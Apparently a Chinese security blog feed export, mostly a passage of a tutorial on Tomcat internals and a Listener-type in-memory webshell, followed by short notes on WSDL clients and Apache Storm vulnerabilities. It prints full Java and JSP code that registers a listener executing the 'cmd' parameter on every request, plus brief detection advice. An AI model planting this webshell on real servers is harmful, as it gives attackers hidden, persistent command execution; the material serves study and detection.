服务器，主要提供接口让其他程序能访问到<code>Service</code>里面，同时维护它所包含的所有<code>Service</code>生命周期（初始化到服务结束等）。Tomcat 只存在一个<code>Server</code>，而<code>Server</code>中至少存在一个<code>Service</code>组件。</p><h3 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h3><p><code>Service</code>包含<code>Connector</code>、<code>Container</code>和其他若干组件，对外提供服务。一个<code>Service</code>可以设置多个<code>Connector</code>组件，但只能有一个<code>Container</code>容器。Tomcat 中<code>Service</code>接口的标准实现类是<code>StandardService</code>，该类还实现了<code>Lifecycle</code>接口用于控制下面组件的生命周期。</p><h3 id="Connector"><a href="#Connector" class="headerlink" title="Connector"></a>Connector</h3><p><code>Connector</code>组件是 Tomcat 中的核心组件之一，主要任务是接受客户端发送的 tcp 连接请求，创建 Request 和 Response 对象分别用于和请求端交换数据，接着生成线程用于处理这两个对象，最后转换成<code>ServletRequest</code>对象传递给<code>Container</code>容器。总结其功能如下：</p><ol><li>和客户端建立通信。</li><li>解析和处理应用层协议，将其封装成 Request 和 Response 对象，将 Request 对象转换成<code>ServletRequest</code>对象，传递给<code>Container</code>容器。</li><li>接收<code>Container</code>传递回来的<code>ServletResponse</code>对象，处理成 Response 对象，转换成 HTTP 响应报文返回到客户端。</li></ol><p>总结图如下所示：<br><img src="images/image-20221026144545789.png" alt="image-20221026144545789"></p><p>从图中可以看到，<code>Connector</code>组件的工作由这三个子组件：<code>EndPoint</code>、<code>Processor</code>和<code>Adapter</code>共同完成，分别负责的功能如下：</p><ul><li><code>EndPoint</code>：负责网络通信，传递字节流到<code>Processor</code>。</li><li><code>Processor</code>：负责处理字节流生成 Tomcat Request 对象，传递到<code>Adapter</code>。</li><li><code>Adapter</code>：负责处理 Tomcat Request 对象，将其转换成<code>ServletRequest</code>。</li></ul><h3 id="Container"><a href="#Container" class="headerlink" title="Container"></a>Container</h3><p><code>Container</code>，别名为<code>Catalina</code>，用于处理<code>Connector</code>组件传递过来的<code>ServletRequest</code>请求。<code>Container</code>容器采用责任链的设计模式，含有四个子容器：<code>Engine</code>、<code>HOST</code>、<code>Context</code>和<code>Wrapper</code>。这四个子容器不是平行关系，而是父子关系，包含关系如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Engine &lt;-- Host &lt;-- Context &lt;-- Wrapper</span><br></pre></td></tr></table></figure><ul><li><code>Engine</code>：最顶层容器组件，包含多个<code>HOST</code>，实现类为<code>org.apache.catalina.core.StandardEngine</code>。</li><li><code>HOST</code>：代表一个虚拟主机，每个虚拟主机和对应域名进行匹配，包含多个<code>Context</code>，实现类为<code>org.apache.catalina.core.StandardHost</code>。</li><li><code>Context</code>：上下文容器，一个<code>Context</code>代表一个 WEB 应用，包含多个<code>Wrapper</code>，实现类为<code>org.apache.catalina.core.StandardContext</code>。</li><li><code>Wrapper</code>：一个<code>Wrapper</code>代表一个<code>Servlet</code>，是对<code>Servlet</code>的抽象包装。<code>Wrapper</code>负责管理<code>Servlrt</code>，包括<code>Servlet</code>的装载、初始化、执行和资源回收等，实习类为<code>org.apache.catalina.core.StandardWrapper</code>。</li></ul><p>示例图如下所示：<img src="images/image-20210402150543076.png" alt="image-20210402150543076"></p><h2 id="Listener型内存马的实现"><a href="#Listener型内存马的实现" class="headerlink" title="Listener型内存马的实现"></a>Listener型内存马的实现</h2><p>在前面的 JavaWeb 基础学习时，我们了解了一些<code>Listener</code>监听器。在这其中，最适合作为内存马的监听器为<code>ServletRequestListener</code>，它用于监听 ServletRequest 对象的创建和销毁过程，因此当我们发起任意请求时，都会触发<code>ServletRequestListener#requestInitialized()</code>方法。</p><p>编写一个<code>ServletRequestListener</code>接口的实现类进行测试：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.servlet.study;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/25 10:35</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListenerTest</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) servletRequestEvent.getServletRequest();</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>访问任意路由都可以执行命令<br><img src="images/image-20221028161656771.png" alt="image-20221028161656771"></p><p>不过这仅仅实现了未回显的命令执行，既然实现了命令执行，我们就得要做到回显。在 java 中，我们可以通过<code>request</code>类的<code>getResponse()</code>方法获取<code>response</code>对象<br><img src="images/image-20221028115517545.png" alt="image-20221028115517545"></p><p>那么如何获取到<code>request</code>类呢？在<code>requestInitialized()</code>方法中预设给我们传入了<code>ServletRequestEvent</code>对象，我们跟进看看<br><img src="images/image-20221028115757707.png" alt="image-20221028115757707"></p><p>这里存在一个<code>ServletRequest</code>类型的<code>request</code>字段，并且通过<code>getServletRequest()</code>方法可以拿到，而<code>servletRequestEvent</code>类可以转换成<code>HttpServletRequest</code>类型接口。</p><p><code>HttpServletRequest</code>类接口是继承<code>ServletRequest</code>接口，而<code>Request</code>类是<code>HttpServletRequest</code>接口的实现类。</p><p>因此我们可以通过反射拿到<code>ServletRequest</code>类中的<code>request</code>实例，然后经过强转类型获得<code>Request</code>对象类型<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.servlet.study;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/25 10:35</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListenerTest</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequestEvent.getServletRequest();</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) field.get(req);</span><br><span class="line">                <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> request.getResponse();</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">while</span>((a = inputStream.read(bytes))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                    bao.write(bytes,<span class="number">0</span>,a);</span><br><span class="line">                &#125;</span><br><span class="line">                response.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bao.toByteArray()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>命令执行结果成功回显<img src="images/image-20221028160217726.png" alt="image-20221028160217726"></p><p>既然我们可以通过恶意的<code>ServletRequestListener</code>实现类触发命令执行，那么接下来就是考虑如何动态注册进服务器中的问题。</p><p>在<code>Runtime.getRuntime().exec()</code>打上断点，然后带上 cmd 参数执行一次弹出计算器看看调用栈<br><img src="images/image-20221027222247432.png" alt="image-20221027222247432"></p><p>可以看到我们构造的<code>ListenerTest()</code>方法的前一个是<code>StandardContext#fireRequestInitEvent()</code>方法，跟进该方法<br><img src="images/image-20221027224618262.png" alt="image-20221027224618262"></p><p>第一行调用了<code>getApplicationEventListeners()</code>方法获取对象数组，跟进该方法<br><img src="images/image-20221027225000747.png" alt="image-20221027225000747"></p><p>可以看到，<code>applicationEventListenersList</code>字段已经存储了我们的<code>ListenerTest</code>类<br><img src="images/image-20221027225147776.png" alt="image-20221027225147776"></p><p>也就是之前已经将<code>ListenerTest</code>类注册进了 Tomcat 服务器，既然是添加我们的恶意类到<code>applicationEventListenersList</code>列表中，那么一定会有一个添加的方法，尝试在该类中全局搜索<code>applicationEventListenersList</code>关键字，最后定位到了<code>addApplicationEventListener()</code>方法<br><img src="images/image-20221027225815382.png" alt="image-20221027225815382"></p><p>因此我们可以通过<code>addApplicationEventListener()</code>方法去将我们的恶意类添加到<code>listener</code>中进行注册，接下来继续跟着方法往下走<br><img src="images/image-20221027230816656.png" alt="image-20221027230816656"></p><p>对获取到的<code>instances</code>数组遍历并进行实例化，最终调用<code>requestInitialized()</code>方法。</p><p>接下来就是如何去获取<code>StandardContext</code>类，网上可以看到师傅们都挖出了很多种办法，关于<code>StandardContext</code>类的调用寻找日后有兴趣再慢慢聊吧。这里取其中一种：<code>StandardHostValve#invoke()</code>方法中可以通过<code>request</code>对象的<code>getContext()</code>方法获取到<code>StandardContext</code>类，而 JSP 本身就内置了<code>request</code>对象<br><img src="images/image-20221027231340401.png" alt="image-20221027231340401"></p><p>接下来就是编写 Listener 型内存马<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;&lt;%--</span><br><span class="line">  Created by dotast on <span class="number">2022</span>/<span class="number">10</span>/<span class="number">27</span> <span class="number">23</span>:<span class="number">16</span></span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ListenerTest</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequestEvent.getServletRequest();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) field.get(req);</span><br><span class="line">                    <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> request.getResponse();</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                    <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">                    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">while</span>((a = inputStream.read(bytes))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                        bao.write(bytes,<span class="number">0</span>,a);</span><br><span class="line">                    &#125;</span><br><span class="line">                    response.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bao.toByteArray()));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) field.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">    <span class="type">ListenerTest</span> <span class="variable">listenerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListenerTest</span>();</span><br><span class="line">    standardContext.addApplicationEventListener(listenerTest);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></p><p>访问上传的内存马文件路径使其执行代码，注册内存马<br><img src="images/image-20221028161442814.png" alt="image-20221028161442814"></p><p>接着访问其他路由都可以成功执行命令<br><img src="images/image-20221028161520448.png" alt="image-20221028161520448"></p><h2 id="内存马的查杀排查"><a href="#内存马的查杀排查" class="headerlink" title="内存马的查杀排查"></a>内存马的查杀排查</h2><p>这里使用的回忆飘如雪师傅写的内存马查杀 JSP 脚本<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/c0ny1/java-memshell-scanner</span><br></pre></td></tr></table></figure></p><p>这里扫描到我们构造的 Listener 内存马，并且提供了 dump 操作供我们检查和 kill 操作供我们进行删除。<br><img src="images/image-20221029101459352.png" alt="image-20221029101459352"></p><p>除此之外我们也可以通过日志进行排查，首先上传的内存马大多都会执行命令，如果存在大量执行了命令但返回状态码为 404 或者 200 的记录可重点进行排查。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java项目杂事</title>
      <link href="/2021/11/10/wsdl/"/>
      <url>/2021/11/10/wsdl/</url>
      
        <content type="html"><![CDATA[<h1 id="wsdl-相关"><a href="#wsdl-相关" class="headerlink" title="wsdl 相关"></a>wsdl 相关</h1><h2 id="恢复成java代码"><a href="#恢复成java代码" class="headerlink" title="恢复成java代码"></a>恢复成java代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">wsimport -keep &quot;test.wsdl&quot; -p com.test -extension</span><br><span class="line"></span><br><span class="line">常用参数为:</span><br><span class="line">-d&lt;目录&gt;  - 将生成.class文件。默认参数。</span><br><span class="line">-s&lt;目录&gt; - 将生成.java文件。</span><br><span class="line">-p&lt;生成的新包名&gt; -将生成的类，放于指定的包下，自定义包结构。</span><br><span class="line">(wsdlurl) - http://server:port/service?wsdl，必须的参数。</span><br><span class="line">示例：</span><br><span class="line">C:/&gt; wsimport –s .</span><br><span class="line">C:/&gt; wsimport –s . –p com.sitech.web</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">注意：-s不能分开，-s后面有个小点，用于指定源代码生成的目录。点即当前目录。</span><br><span class="line">如果使用了-s参数则会在目录下生成两份代码，一份为.class代码。一份为.java代码。</span><br><span class="line">.class代码，可以经过打包以后使用。.java代码可以直接Copy到我们的项目中运行。</span><br></pre></td></tr></table></figure><h2 id="客户端调用"><a href="#客户端调用" class="headerlink" title="客户端调用"></a>客户端调用</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.cxf<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cxf-rt-frontend-jaxws<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.cxf<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cxf-rt-transports-http<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>java代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.cxf.endpoint.Client;</span><br><span class="line"><span class="keyword">import</span> org.apache.cxf.jaxws.endpoint.dynamic.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *https://www.programcreek.com/java-api-examples/?api=org.apache.cxf.jaxws.endpoint.dynamic.JaxWsDynamicClientFactory</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">JaxWsDynamicClientFactory</span> <span class="variable">factory</span> <span class="operator">=</span> JaxWsDynamicClientFactory.newInstance();</span><br><span class="line">        <span class="type">Client</span> <span class="variable">client</span> <span class="operator">=</span> factory.createClient(<span class="string">&quot;http://1.116.136.120:58081/admin/service/UserService?wsdl&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object[] objects = client.invoke(<span class="string">&quot;sayHello&quot;</span>,<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">            Arrays.stream(objects).forEach(System.out::println);</span><br><span class="line">            client.destroy();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://blog.51cto.com/u_15127638/2751110">https://blog.51cto.com/u_15127638/2751110</a><br><a href="https://blog.csdn.net/qq_32447301/article/details/79204311">https://blog.csdn.net/qq_32447301/article/details/79204311</a><br><a href="http://www.360doc.com/content/17/0105/20/835902_620335609.shtml">http://www.360doc.com/content/17/0105/20/835902_620335609.shtml</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>apache storm</title>
      <link href="/2021/11/10/1/"/>
      <url>/2021/11/10/1/</url>
      
        <content type="html"><![CDATA[<h2 id="top-img-images-下载-png"><a href="#top-img-images-下载-png" class="headerlink" title="top_img: /images/下载.png"></a>top_img: /images/下载.png</h2><h1 id="apache-storm"><a href="#apache-storm" class="headerlink" title="apache storm"></a>apache storm</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://blog.51cto.com/u_13870740/3445168">https://blog.51cto.com/u_13870740/3445168</a></p><p><a href="https://github.com/heibaiying/BigData-Notes/blob/master/notes/installation/Storm%E5%8D%95%E6%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md">https://github.com/heibaiying/BigData-Notes/blob/master/notes/installation/Storm%E5%8D%95%E6%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup bash storm dev-zookeeper &amp; bash storm nimbus &amp; bash storm supervisor &amp;bash storm ui &amp; bash storm logviewer &amp;</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><a href="https://paper.seebug.org/1780/#0x03">https://paper.seebug.org/1780/#0x03</a></p><p><a href="https://blog.noah.360.net/apache-storm-vulnerability-analysis/">https://blog.noah.360.net/apache-storm-vulnerability-analysis/</a></p><p><a href="https://y4er.com/posts/apache-storm-two-cve/">https://y4er.com/posts/apache-storm-two-cve/</a></p><p><strong>自己尝试反序列化并没有成功cb,环境是2.1.0</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>seacherobj</title>
      <link href="/2021/11/10/searchobj/"/>
      <url>/2021/11/10/searchobj/</url>
      
